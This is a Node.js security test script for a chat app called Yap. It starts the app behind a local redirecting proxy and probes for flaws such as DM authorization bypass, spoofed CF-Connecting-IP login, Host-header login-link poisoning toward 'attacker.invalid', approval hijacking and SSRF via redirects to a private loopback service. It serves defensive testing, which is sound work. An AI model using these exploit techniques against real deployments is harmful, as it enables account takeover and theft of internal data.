import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { spawn } from 'node:child_process';
import { randomUUID } from 'node:crypto';
const repo=process.env.YAP_REPO || '/d/PROJECTS/d3mnjx/repos/urza/Yap-r2';
const root=fs.mkdtempSync('/tmp/yap-r2-security/root-');fs.mkdirSync(path.join(root,'Data'));fs.mkdirSync(path.join(root,'wwwroot'));
fs.writeFileSync(path.join(root,'Data/link-preview-settings.json'),JSON.stringify({Enabled:true,MediaCachingEnabled:false}));
const base='http://127.0.0.1:5121';const proxyPort=5122,privatePort=5123;
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const privateHits=[];const proxyHits=[];
const privateServer=http.createServer((req,res)=>{privateHits.push(req.url);res.setHeader('Content-Type',req.url.includes('html')?'text/html':'application/octet-stream');res.end(req.url.includes('html')?'<html><head><title>PRIVATE_SERVICE_TITLE</title><meta property="og:description" content="PRIVATE_SERVICE_SECRET"></head></html>':'PRIVATE_INTERNAL_SECRET_BYTES');});
const proxy=http.createServer((req,res)=>{proxyHits.push(req.url);res.writeHead(302,{Location:`http://127.0.0.1:${privatePort}/${req.url.includes('html')?'secret.html':'secret.gif'}`});res.end();});
await Promise.all([new Promise(r=>privateServer.listen(privatePort,'127.0.0.1',r)),new Promise(r=>proxy.listen(proxyPort,'127.0.0.1',r))]);
const out=fs.openSync(path.join(root,'server.log'),'w');
const app=spawn('/usr/local/bin/dotnet',[path.join(repo,'Yap/bin/Debug/net10.0/Yap.dll'),'--contentRoot',root,'--urls',base,'--ChatSettings:Persistence:Enabled=false','--ChatSettings:WelcomePageEnabled=false'],{cwd:root,env:{...process.env,PATH:'/usr/bin:/bin',ASPNETCORE_ENVIRONMENT:'Production',HTTP_PROXY:`http://127.0.0.1:${proxyPort}`,HTTPS_PROXY:`http://127.0.0.1:${proxyPort}`,http_proxy:`http://127.0.0.1:${proxyPort}`,https_proxy:`http://127.0.0.1:${proxyPort}`,ALL_PROXY:'',all_proxy:'',NO_PROXY:'127.0.0.1,localhost',no_proxy:'127.0.0.1,localhost'},stdio:['ignore',out,out]});
const hubs=[];const findings=[];
async function request(user,p,body,method=body===undefined?'GET':'POST',headers={}){
 const r=await fetch(base+p,{method,headers:{...(user?{Cookie:user.cookie,'CF-Connecting-IP':user.ip}:{}),...(body!==undefined?{'Content-Type':'application/json'}:{}),...headers},body:body===undefined?undefined:JSON.stringify(body)});
 const raw=await r.text();let data;try{data=JSON.parse(raw)}catch{data=raw};return {status:r.status,data,cookie:r.headers.get('set-cookie')?.split(';')[0],headers:Object.fromEntries(r.headers)};
}
async function signup(name,ip){const r=await request(null,'/api/auth/signin',{username:name},'POST',{'CF-Connecting-IP':ip});if(r.status!==200)throw Error(JSON.stringify(r));return {name,ip,cookie:r.cookie};}
async function post(u,room,text,extra={}){return request(u,`/api/channels/${room}/messages`,{clientId:randomUUID(),text,...extra});}
async function wait(fn,ms=6000){const end=Date.now()+ms;while(Date.now()<end){const v=await fn();if(v)return v;await sleep(50)}return null;}
class Hub{
 constructor(u){this.u=u;this.events=[];this.pending=new Map();this.seq=0;this.stopped=false;}
 async start(){const r=await request(this.u,'/hub/negotiate?negotiateVersion=1',{},'POST');this.id=r.data.connectionToken;this.url=base+'/hub?id='+encodeURIComponent(this.id);await fetch(this.url,{headers:{Cookie:this.u.cookie}});this.polling=this.poll();await this.send({protocol:'json',version:1});await wait(()=>this.handshake);hubs.push(this);return this;}
 async send(o){const r=await fetch(this.url,{method:'POST',headers:{Cookie:this.u.cookie,'Content-Type':'text/plain'},body:JSON.stringify(o)+'\x1e'});if(!r.ok)throw Error('hub post '+r.status);}
 async poll(){while(!this.stopped){try{const r=await fetch(this.url,{headers:{Cookie:this.u.cookie},signal:AbortSignal.timeout(35000)});if(r.status!==200)break;for(const s of (await r.text()).split('\x1e').filter(Boolean)){const m=JSON.parse(s);if(!m.type)this.handshake=true;else if(m.type===3){this.pending.get(m.invocationId)?.(m);this.pending.delete(m.invocationId);}else if(m.type===1)this.events.push(m);}}catch(e){if(!this.stopped)console.log('POLL_ERROR',e.message);break;}}}
 async call(target,...args){const id=String(++this.seq);let timer;const p=new Promise((resolve,reject)=>{timer=setTimeout(()=>reject(Error('hub timeout '+target)),6000);this.pending.set(id,resolve)});await this.send({type:1,invocationId:id,target,arguments:args});try{const r=await p;return r.error?{error:r.error}:r.result}finally{clearTimeout(timer)}}
 async stop(){this.stopped=true;await fetch(this.url,{method:'DELETE',headers:{Cookie:this.u.cookie}}).catch(()=>{});}
}
async function test(name,fn){if(!/origin poisoning|SSRF/.test(name)) return;try{const result=await fn();findings.push({name,...result});console.log(JSON.stringify({name,...result}));}catch(e){console.log(JSON.stringify({name,testError:e.stack}));}}
const clean=o=>({status:o.status,data:o.data});
try{
 if(!await wait(async()=>{try{return(await fetch(base+'/api/bootstrap')).ok}catch{return false}},20000))throw Error('app failed: '+fs.readFileSync(path.join(root,'server.log'),'utf8'));
 const admin=await signup('secadmin','198.51.100.1');
 const a=await signup('secalice','198.51.100.10');
 const b=await signup('secbob','198.51.100.20');
 const c=await signup('seceve','198.51.100.30');
 const lobby=(await request(a,'/api/bootstrap')).data.rooms[0].id;
 const ah=await new Hub(a).start(),bh=await new Hub(b).start(),ch=await new Hub(c).start(),admh=await new Hub(admin).start();
 const dm=(await ah.call('OpenDm',b.name)).channelId;
 const secret=(await post(a,dm,'DM_PRIVATE_CONTROL')).data;
 await test('Controls: direct DM reads sends edits deletes and reactions',async()=>({older:await ch.call('Older',dm,new Date(Date.now()+1000).toISOString(),randomUUID()),send:clean(await post(c,dm,'unauthorized')),edit:await ch.call('Edit',secret.id,'unauthorized'),delete:await ch.call('Delete',secret.id),react:await ch.call('React',secret.id,'👍'),adminRoute:(await request(c,'/api/admin/users')).status}));
 await test('History cutoff: reply quote and edit broadcast',async()=>{
  const room=(await request(admin,'/api/rooms',{name:'restricted',sinceJoined:true,historyLimit:'unlimited'})).data;
  const old=(await post(admin,room.id,'HIDDEN_BEFORE_JOIN')).data;
  await sleep(100);const newcomer=await signup('secnew','198.51.100.40');const nh=await new Hub(newcomer).start();
  const initial=await nh.call('OpenRoom',room.id);
  const reply=await post(admin,room.id,'ordinary admin reply',{replyToId:old.id});await sleep(100);
  const quote=nh.events.find(e=>e.target==='message'&&e.arguments[0].id===reply.data.id)?.arguments[0]?.replyTo;
  await admh.call('Edit',old.id,'HIDDEN_EDITED_SECRET');await sleep(200);
  const edited=nh.events.find(e=>e.target==='messageEdited'&&e.arguments[0].id===old.id)?.arguments[0];
  return {initialMessages:initial.messages.length,restricted:initial.restricted,replyQuote:quote,hiddenEdit:edited,bug:quote?.text==='HIDDEN_BEFORE_JOIN'&&edited?.text==='HIDDEN_EDITED_SECRET'};
 });
 let gifId;
 async function upload(user,name,bytes,extra={}){
  const meta={filename:name,filetype:'image/gif',...extra};const r=await fetch(base+'/api/tus',{method:'POST',headers:{Cookie:user.cookie,'Tus-Resumable':'1.0.0','Upload-Length':String(bytes.length),'Upload-Metadata':Object.entries(meta).map(([k,v])=>k+' '+Buffer.from(v).toString('base64')).join(',')}});const location=r.headers.get('location');
  const patch=await fetch(new URL(location,base),{method:'PATCH',headers:{Cookie:user.cookie,'Tus-Resumable':'1.0.0','Upload-Offset':'0','Content-Type':'application/offset+octet-stream'},body:bytes});
  return {location,patch:patch.status,id:location.split('/').at(-1)};
 }
 const gif=Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7','base64');
 await test('Private GIF: unrestricted send, tags, favorite and export',async()=>{
  const uploaded=await upload(a,'privatefamily.gif',gif,{kind:'gif',target:'user'});
  const info=(await request(a,'/api/tus/info/'+uploaded.id)).data;gifId=info.gifEntryId;
  const searchBefore=(await request(c,'/api/gifs/search?q=privatefamily')).data.library;
  const send=await post(c,lobby,'',{gif:{entryId:gifId}});
  const tag=await request(c,`/api/gifs/${gifId}/tags`,{tags:['changed-by-stranger']},'PUT');
  const star=await request(c,`/api/gifs/${gifId}/favorite`,{on:true},'PUT');
  const favorite=(await request(c,'/api/gifs/favorites')).data.gifs.find(g=>g.id===gifId);
  const exportRes=await fetch(base+'/api/gifs/export',{headers:{Cookie:c.cookie}});const zip=Buffer.from(await exportRes.arrayBuffer());
  const deleteOther=await request(c,`/api/gifs/${gifId}`,undefined,'DELETE');
  return {bug:searchBefore.length===0&&send.status===200&&favorite?.id===gifId,privateId:gifId,searchBefore,send:clean(send),tagStatus:tag.status,starStatus:star.status,favorite,exportStatus:exportRes.status,exportBytes:zip.length,deleteControl:deleteOther.status};
 });
 await test('Upload completion info is anonymous and consumed by first reader',async()=>{
  const uploaded=await upload(a,'owneronly.gif',gif);
  const anon=await request(null,'/api/tus/info/'+uploaded.id);
  const owner=await request(a,'/api/tus/info/'+uploaded.id);
  return {bug:anon.status===200&&owner.status===404,anonymous:clean(anon),owner:clean(owner)};
 });
 await test('Other account can inspect and terminate unfinished upload',async()=>{
  const r=await fetch(base+'/api/tus',{method:'POST',headers:{Cookie:a.cookie,'Tus-Resumable':'1.0.0','Upload-Length':'100','Upload-Metadata':'filename '+Buffer.from('alice-private-name.png').toString('base64')}});
  const url=new URL(r.headers.get('location'),base);
  const anon=await fetch(url,{method:'HEAD',headers:{'Tus-Resumable':'1.0.0'}});
  const other=await fetch(url,{method:'HEAD',headers:{Cookie:c.cookie,'Tus-Resumable':'1.0.0'}});
  const deletion=await fetch(url,{method:'DELETE',headers:{Cookie:c.cookie,'Tus-Resumable':'1.0.0'}});
  const owner=await fetch(url,{method:'HEAD',headers:{Cookie:a.cookie,'Tus-Resumable':'1.0.0'}});
  return {bug:other.ok&&deletion.ok&&owner.status===404,anonymousStatus:anon.status,otherStatus:other.status,metadata:other.headers.get('upload-metadata'),deletionStatus:deletion.status,ownerStatus:owner.status};
 });
 await test('Other account can unsubscribe a push endpoint',async()=>{
  const endpoint='https://push.invalid/test-'+randomUUID();
  const registered=await request(a,'/api/push/subscribe',{endpoint,p256dh:'TEST_KEY',auth:'TEST_AUTH'});
  const protectedRoute=await request(c,'/api/push/devices',{endpoint},'DELETE');
  const bypass=await request(c,'/api/push/unsubscribe',{endpoint});
  const devices=await request(a,'/api/push/devices');
  return {bug:registered.status===200&&protectedRoute.status===404&&bypass.status===200&&devices.data.length===0,registeredStatus:registered.status,protectedRouteStatus:protectedRoute.status,bypassStatus:bypass.status,remaining:devices.data.length};
 });
 await test('Smart login trusts spoofed proxy IP headers',async()=>{
  const denied=await request(null,'/api/auth/signin',{username:a.name},'POST',{'CF-Connecting-IP':'203.0.113.200'});
  const bypass=await request(null,'/api/auth/signin',{username:a.name},'POST',{'CF-Connecting-IP':a.ip});
  return {bug:denied.status===401&&bypass.status===200,denied:clean(denied),bypass:clean(bypass),issuedCookie:!!bypass.cookie};
 });
 await test('Global login-link origin poisoning',async()=>{
  const before=(await request(a,'/api/account/link')).data;
  const poison=await new Promise((resolve,reject)=>{const q=http.request(base+'/api/bootstrap',{headers:{Cookie:c.cookie,Host:'attacker.invalid','X-Forwarded-Proto':'https'}},r=>{r.resume();r.on('end',()=>resolve({status:r.statusCode}))});q.on('error',reject);q.end();});
  const after=(await request(a,'/api/account/link')).data;
  await request(a,'/api/bootstrap');
  return {bug:after.url.startsWith('https://attacker.invalid/'),poisonStatus:poison.status,beforeUrl:before.url,afterUrl:after.url};
 });
 await test('Approved registration can be claimed by another requester',async()=>{
  await request(admin,'/api/admin/settings',{requireApproval:true,smartLogin:false},'PUT');
  const original=await request(null,'/api/auth/signin',{username:'approvedvictim'},'POST',{'CF-Connecting-IP':'198.51.100.50'});
  await request(admin,'/api/admin/pending/approvedvictim/approve',{},'POST');
  const stolen=await request(null,'/api/auth/signin',{username:'approvedvictim'},'POST',{'CF-Connecting-IP':'203.0.113.200'});
  const rightful=await request(null,'/api/auth/signin',{username:'approvedvictim'},'POST',{'CF-Connecting-IP':'198.51.100.50'});
  await request(admin,'/api/admin/settings',{requireApproval:false},'PUT');
  return {bug:original.status===202&&stolen.status===200&&rightful.status===401,original:clean(original),stolen:clean(stolen),rightful:clean(rightful)};
 });
 await test('SSRF: direct loopback blocked, GIF redirect fetches private bytes',async()=>{
  const provider=url=>({sourceId:randomUUID(),title:'redirect probe',width:1,height:1,formats:[{url,contentType:'image/gif',width:1,height:1,sizeBytes:1}],previewFormats:[],tags:[]});
  const directHits=privateHits.length;
  await post(c,lobby,'',{gif:{provider:provider(`http://127.0.0.1:${privatePort}/direct.gif`)}});await sleep(500);
  const directContacted=privateHits.length>directHits;
  const sent=await post(c,lobby,'',{gif:{provider:provider('http://example.com/review-redirect.gif')}});
  const id=sent.data.gifs[0].entryId;
  const cached=await wait(async()=>{const r=await fetch(base+`/gif-cache/${id}.gif`);if(r.ok)return await r.text();return null},8000);
  return {bug:cached==='PRIVATE_INTERNAL_SECRET_BYTES',directContacted,sendStatus:sent.status,cachedBody:cached,privateHits:[...privateHits],proxyHits:[...proxyHits]};
 });
 await test('SSRF: link preview redirect discloses private service title',async()=>{
  const sent=await post(c,lobby,'http://example.com/review-redirect.html');
  const preview=await wait(async()=>{const page=await ch.call('OpenRoom',lobby);return page.messages.find(m=>m.id===sent.data.id)?.previews?.[0]},8000);
  return {bug:preview?.title==='PRIVATE_SERVICE_TITLE',preview,privateHits:[...privateHits]};
 });
}finally{
 for(const h of hubs)await h.stop();
 app.kill();await new Promise(r=>app.once('exit',r));fs.closeSync(out);
 privateServer.close();proxy.close();
 fs.writeFileSync('/tmp/yap-r2-security/redirect-results.json',JSON.stringify(findings,null,2));console.log('SCRATCH_ROOT',root);
}
